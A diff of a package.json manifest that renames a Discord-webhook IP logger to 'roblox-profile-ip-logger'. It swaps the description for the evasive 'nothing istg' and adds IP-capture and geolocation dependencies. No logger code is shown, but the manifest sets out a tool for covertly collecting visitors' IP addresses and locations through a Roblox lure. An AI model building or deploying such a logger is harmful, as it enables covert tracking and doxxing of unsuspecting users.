@@ -1,14 +1,21 @@
 {
-  "name": "horizon-ip-logger",
+  "name": "roblox-profile-ip-logger",
   "version": "1.0.0",
-  "description": "Logs IP addresses to a Discord webhook",
-  "main": "index.js",
+  "description": "nothing istg",
+  "main": "server.js",
   "scripts": {
-    "start": "node index.js"
+    "start": "node server.js"
   },
   "dependencies": {
-    "express": "^4.19.2",
-    "node-fetch": "^3.3.2"
+    "express": "^4.18.2",
+    "request-ip": "^3.3.0",
+    "geoip-lite": "^2.0.3",
+    "axios": "^1.5.0"
   },
-  "type": "module"
+  "engines": {
+    "node": ">=18.x"
+  },
+  "keywords": ["roblox", "ip-logger"],
+  "author": "560h",
+  "license": "MIT"
 }
